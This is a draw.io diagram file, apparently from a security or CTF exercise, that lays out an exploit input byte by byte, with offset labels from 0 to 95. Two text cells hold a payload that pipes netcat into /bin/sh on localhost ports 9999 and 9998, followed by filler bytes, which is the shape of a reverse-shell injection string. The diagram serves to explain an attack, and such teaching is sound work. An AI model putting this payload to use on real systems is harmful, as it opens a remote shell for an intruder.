<mxfile host="app.diagrams.net" modified="2023-10-25T11:47:30.135Z" agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" etag="idOZQJme0iFyIsxyVrPy" version="22.0.7" type="github">
  <diagram name="第 1 页" id="hiHuTb3BUYty62E2j1ty">
    <mxGraphModel dx="733" dy="491" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
      <root>
        <mxCell id="0" />
        <mxCell id="1" parent="0" />
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-22" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="244" y="228" as="sourcePoint" />
            <mxPoint x="244" y="194.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-23" value="/bin/netcat#127.0.0.1#9999|#/bin/sh|#/bin/netcat#127.0.0.1#9998#AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;fontFamily=Times New Roman;fontStyle=1;fontSize=18;spacing=6;spacingTop=2;spacingBottom=2;spacingLeft=2;spacingRight=2;fontColor=#333333;" vertex="1" parent="1">
          <mxGeometry x="227" y="165" width="930" height="40" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-24" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="328" y="228" as="sourcePoint" />
            <mxPoint x="328" y="194.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-25" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="338" y="228" as="sourcePoint" />
            <mxPoint x="338" y="194.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-26" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="405" y="228" as="sourcePoint" />
            <mxPoint x="405" y="194.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-27" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="414" y="228" as="sourcePoint" />
            <mxPoint x="414" y="194.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-28" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="454" y="228" as="sourcePoint" />
            <mxPoint x="454" y="194.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-29" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="462" y="228" as="sourcePoint" />
            <mxPoint x="462" y="194.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-30" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="519" y="227" as="sourcePoint" />
            <mxPoint x="519" y="193.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-31" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="526" y="227" as="sourcePoint" />
            <mxPoint x="526" y="193.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-32" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="611" y="228" as="sourcePoint" />
            <mxPoint x="611" y="194.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-33" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="620" y="229" as="sourcePoint" />
            <mxPoint x="620" y="195.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-34" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="687" y="229" as="sourcePoint" />
            <mxPoint x="687" y="195.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-35" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="696" y="230" as="sourcePoint" />
            <mxPoint x="696" y="196.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-36" value="0" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="227" y="220" width="30" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-37" value="11" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="305" y="219" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-39" value="12" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="319" y="219" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-40" value="21" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="382" y="219" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-41" value="22" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="397" y="220" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-42" value="27" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="429" y="219" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-43" value="28" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="445" y="219" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-44" value="36" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="493" y="219" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-45" value="37" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="510" y="219" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-46" value="48" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="587" y="220" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-47" value="49" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="602" y="220" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-48" value="58" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="663" y="220" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-49" value="59" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="678" y="220" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-50" value="63" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="708" y="220" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-51" value="64" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="723" y="220" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-52" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="732" y="228" as="sourcePoint" />
            <mxPoint x="732" y="194.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-53" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="741" y="229" as="sourcePoint" />
            <mxPoint x="741" y="195.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-56" value="68" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="773" y="220" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-57" value="72" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="822" y="220" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-58" value="76" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="873" y="219" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-59" value="80" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="925" y="218" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-60" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="794" y="228" as="sourcePoint" />
            <mxPoint x="794" y="194.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-61" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="844" y="228" as="sourcePoint" />
            <mxPoint x="844" y="194.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-62" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="894" y="229" as="sourcePoint" />
            <mxPoint x="894" y="195.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-63" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="945" y="227" as="sourcePoint" />
            <mxPoint x="945" y="193.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-64" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="993" y="227" as="sourcePoint" />
            <mxPoint x="993" y="193.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-65" value="84" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="973" y="219" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-66" value="95" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="1020" y="138" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-67" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="1039" y="228" as="sourcePoint" />
            <mxPoint x="1039" y="194.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-68" value="88" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="1019" y="220" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-69" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="1092" y="227" as="sourcePoint" />
            <mxPoint x="1092" y="193.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-70" value="92" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="1072" y="219" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-71" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="197" y="410" as="sourcePoint" />
            <mxPoint x="197" y="376.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-72" value="/bin/netcat#127.0.0.1#9999|#/bin/sh|#/bin/netcat#127.0.0.1#9998#AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;fontFamily=Times New Roman;fontStyle=1;fontSize=18;spacing=6;spacingTop=2;spacingBottom=2;spacingLeft=2;spacingRight=2;fontColor=#333333;" vertex="1" parent="1">
          <mxGeometry x="180" y="347" width="930" height="40" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-73" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="281" y="410" as="sourcePoint" />
            <mxPoint x="281" y="376.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-74" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="291" y="410" as="sourcePoint" />
            <mxPoint x="291" y="376.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-75" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="358" y="410" as="sourcePoint" />
            <mxPoint x="358" y="376.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-76" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="367" y="410" as="sourcePoint" />
            <mxPoint x="367" y="376.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-77" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="407" y="410" as="sourcePoint" />
            <mxPoint x="407" y="376.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-78" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="415" y="410" as="sourcePoint" />
            <mxPoint x="415" y="376.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-79" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="472" y="409" as="sourcePoint" />
            <mxPoint x="472" y="375.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-80" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="479" y="409" as="sourcePoint" />
            <mxPoint x="479" y="375.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-81" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="564" y="410" as="sourcePoint" />
            <mxPoint x="564" y="376.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-82" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="573" y="411" as="sourcePoint" />
            <mxPoint x="573" y="377.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-83" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="640" y="411" as="sourcePoint" />
            <mxPoint x="640" y="377.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-84" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="649" y="412" as="sourcePoint" />
            <mxPoint x="649" y="378.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-85" value="0" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="180" y="402" width="30" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-86" value="11" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="258" y="401" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-87" value="12" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="272" y="401" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-88" value="21" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="335" y="401" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-89" value="22" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="350" y="402" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-90" value="27" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="382" y="401" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-91" value="28" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="398" y="401" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-92" value="36" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="446" y="401" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-93" value="37" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="463" y="401" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-94" value="48" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="540" y="402" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-95" value="49" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="555" y="402" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-96" value="58" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="616" y="402" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-97" value="59" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="631" y="402" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-98" value="63" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="661" y="402" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-99" value="64" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="676" y="402" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-100" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="685" y="410" as="sourcePoint" />
            <mxPoint x="685" y="376.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-101" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="694" y="411" as="sourcePoint" />
            <mxPoint x="694" y="377.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-102" value="68" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="726" y="402" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-103" value="72" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="775" y="402" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-104" value="76" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="826" y="401" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-105" value="80" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="878" y="400" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-106" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="747" y="410" as="sourcePoint" />
            <mxPoint x="747" y="376.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-107" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
